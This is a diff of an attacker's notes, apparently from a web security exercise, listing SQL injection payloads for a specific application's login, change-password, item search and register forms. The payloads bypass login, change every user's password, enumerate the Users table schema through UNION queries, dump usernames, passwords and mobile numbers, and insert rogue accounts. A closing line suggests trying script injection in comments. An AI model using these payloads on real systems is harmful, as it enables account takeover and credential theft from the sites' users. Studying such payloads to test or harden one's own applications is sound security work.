@@ -1,26 +1,28 @@
 ﻿//login
-' OR 1=1 -- 
+this logs you in as the username you have guessed:  ' OR 1=1 -- 
 
 //change password
-' OR 1=1 -- 
-' OR Username = 'admin' AND Password = 'admin' -- 
-
+This goes in old password textbox - this changes the password without knowing the old password:   ' OR 1=1 
+This changes the password of every user in the database: 
+new password >> 123 // old password >> ' OR 1=1; Update Users Set Password=123;--
+This changes a targeted user password:  ' OR Username = 'user2' OR Password = 'admin'; -- //old password textbox
 
 //SEARCH IN items
 //ordering and discovering column numbers. if the order by <num> gives an error than there are no more columns
-' ORDER BY 1--'
+//SElect Id, Name, Description, Price From Items where name = '..............'  
+' ORDER BY 1--; ' ORDER BY 2--; ' ORDER BY 3--; 
+
 //gets the actual column names
-' UNION SELECT column_name, null, null, null FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name = 'Users' --'
+Select Id, Name, Description, Price From Items where name = '' UNION SELECT 0,column_name, '', 0 FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name = 'Users'; --  
+' UNION SELECT 0,column_name, '', 0 FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name = 'Users'; --
 //gets the actual content of columns after discovering the column names
-' UNION SELECT null, firstName, lastName, null FROM Users -- 
+' UNION SELECT 0, username, password, mobile FROM Users; -- 
 
 //register
-//register a user (bypassing any validations)
-'; INSERT INTO Users (Username, Password, Mobile) VALUES ('attacker', 'password', '1234567890'); --
+//register a user (bypassing any validations). try to click register many times
+', '', 1); INSERT INTO Users (Username, Password, Mobile) VALUES ('attacker', 'password', 1234567890); --
 
-//multiple users insert:
-a','b',1); INSERT INTO Users (Username, Password, Mobile) VALUES('user1', 'password1', '1234567890'),('user2', 'password2', '1234567891'),('user3', 'password3', '1234567892'),('user4', 'password4', '1234567893'),('user5', 'password5', '1234567894'),('user6', 'password6', '1234567895');-- 
-
+ 
 //possible deletes?
 
 //try adding a comment with some script!
